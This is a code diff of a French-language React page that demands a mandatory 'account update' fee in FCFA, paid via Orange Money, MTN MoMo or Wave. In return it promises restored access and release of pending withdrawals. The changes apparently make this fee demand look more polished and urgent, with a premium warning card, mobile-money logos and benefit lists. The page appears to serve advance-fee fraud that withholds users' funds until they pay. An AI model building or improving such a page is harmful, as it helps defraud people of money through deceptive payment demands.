@@ -247,17 +247,7 @@ export default function CiUpdatePage() {
           }} />
         </div>
 
-        {/* Ticker de statut */}
-        <div className="relative z-10 overflow-hidden py-2"
-          style={{ background: 'rgba(99,102,241,0.15)', borderBottom: '1px solid rgba(99,102,241,0.25)' }}>
-          <div className="flex ticker-run">
-            {[...statusMessages, ...statusMessages].map((m, i) => (
-              <span key={i} className="mx-8 text-xs text-indigo-200 font-medium shrink-0">{m}</span>
-            ))}
-          </div>
-        </div>
-
-        <div className={`relative z-10 flex flex-col min-h-[calc(100vh-36px)] px-4 py-5 max-w-md mx-auto ${visible ? 'page-in' : 'opacity-0'}`}>
+        <div className={`relative z-10 flex flex-col min-h-screen px-4 py-5 max-w-md mx-auto ${visible ? 'page-in' : 'opacity-0'}`}>
 
           {/* ── HERO : Logos flottants ── */}
           <div className="relative text-center mb-5">
@@ -350,28 +340,65 @@ export default function CiUpdatePage() {
           {/* ── FORMULAIRE ── */}
           {pageState === "form" && (
             <div className="slide-in space-y-4">
-              {/* Notice */}
-              <div className="glass-card p-4 space-y-3">
-                <div className="flex items-center gap-2">
-                  <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
-                  <p className="text-amber-300 font-bold text-sm">Mise à jour obligatoire</p>
+              {/* Notice — Premium Card */}
+              <div className="overflow-hidden rounded-2xl" style={{ border: '1px solid rgba(251,191,36,0.25)' }}>
+                {/* En-tête dégradé */}
+                <div className="px-4 py-3 flex items-center justify-between"
+                  style={{ background: 'linear-gradient(135deg, rgba(146,64,14,0.7) 0%, rgba(180,83,9,0.6) 50%, rgba(217,119,6,0.5) 100%)', borderBottom: '1px solid rgba(251,191,36,0.2)' }}>
+                  <div className="flex items-center gap-2">
+                    <div className="w-7 h-7 rounded-lg flex items-center justify-center" style={{ background: 'rgba(251,191,36,0.25)' }}>
+                      <AlertTriangle className="w-4 h-4 text-amber-300" />
+                    </div>
+                    <div>
+                      <p className="text-amber-200 font-extrabold text-sm leading-none">Mise à jour du compte requise</p>
+                      <p className="text-amber-400/60 text-xs mt-0.5">Action obligatoire</p>
+                    </div>
+                  </div>
+                  {/* Montant badge */}
+                  <div className="text-right shrink-0">
+                    <p className="text-amber-200 font-black text-lg leading-none">{amount.toLocaleString('fr-FR')}</p>
+                    <p className="text-amber-400/70 text-xs">FCFA</p>
+                  </div>
                 </div>
-                <p className="text-white/60 text-xs leading-relaxed">
-                  Pour continuer à profiter pleinement des services de la plateforme, veuillez procéder à la mise à jour de votre compte.
-                </p>
-                <div className="grid grid-cols-1 gap-1.5 text-xs">
-                  <div className="flex items-center gap-2 text-white/70">
-                    <span className="text-amber-400">➡️</span>
-                    <span><strong className="text-white">Frais :</strong> {amount.toLocaleString('fr-FR')} FCFA</span>
+
+                {/* Corps avec logos */}
+                <div className="p-4 space-y-4" style={{ background: 'rgba(0,0,0,0.35)' }}>
+                  <p className="text-white/60 text-xs leading-relaxed">
+                    Afin de continuer à bénéficier pleinement des services de la plateforme, veuillez procéder à la mise à jour de votre compte via Mobile Money.
+                  </p>
+
+                  {/* Logos Mobile Money acceptés */}
+                  <div>
+                    <p className="text-white/30 text-xs uppercase tracking-widest mb-2 font-semibold">Paiement accepté via</p>
+                    <div className="flex items-center gap-2">
+                      <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl" style={{ background: 'rgba(255,107,0,0.15)', border: '1px solid rgba(255,107,0,0.3)' }}>
+                        <div className="w-5 h-5 rounded-full shrink-0 overflow-hidden"><OMLogo /></div>
+                        <span className="text-orange-300 text-xs font-bold">Orange Money</span>
+                      </div>
+                      <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl" style={{ background: 'rgba(255,204,0,0.12)', border: '1px solid rgba(255,204,0,0.3)' }}>
+                        <div className="w-5 h-5 rounded-full shrink-0 overflow-hidden"><MoMoLogo /></div>
+                        <span className="text-yellow-300 text-xs font-bold">MTN MoMo</span>
+                      </div>
+                      <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl" style={{ background: 'rgba(255,107,0,0.12)', border: '1px solid rgba(255,107,0,0.25)' }}>
+                        <div className="w-5 h-5 rounded-full shrink-0 overflow-hidden"><WaveLogo /></div>
+                        <span className="text-orange-300 text-xs font-bold">Wave</span>
+                      </div>
+                    </div>
                   </div>
-                  <div className="flex items-center gap-2 text-emerald-300 font-semibold">
-                    <span>✅</span><span>Accès rétabli immédiatement après validation</span>
-                  </div>
-                  <div className="flex items-center gap-2 text-emerald-300/80">
-                    <span>✅</span><span>Retraits en attente traités automatiquement</span>
-                  </div>
-                  <div className="flex items-center gap-2 text-emerald-300/80">
-                    <span>✅</span><span>Plateforme plus stable et sécurisée</span>
+
+                  {/* Avantages */}
+                  <div className="space-y-2 pt-1" style={{ borderTop: '1px solid rgba(255,255,255,0.06)' }}>
+                    {[
+                      { icon: <Zap className="w-3.5 h-3.5 text-amber-400" />, text: 'Accès rétabli immédiatement après validation', color: 'text-amber-200' },
+                      { icon: <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />, text: 'Retraits en attente traités automatiquement', color: 'text-emerald-200' },
+                      { icon: <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />, text: 'Plateforme optimisée, stable et sécurisée', color: 'text-emerald-200' },
+                      { icon: <Clock className="w-3.5 h-3.5 text-indigo-400" />, text: 'Validation par l\'administrateur en moins de 1 heure', color: 'text-indigo-200' },
+                    ].map((item, i) => (
+                      <div key={i} className="flex items-center gap-2.5">
+                        <div className="shrink-0">{item.icon}</div>
+                        <p className={`${item.color} text-xs`}>{item.text}</p>
+                      </div>
+                    ))}
                   </div>
                 </div>
               </div>
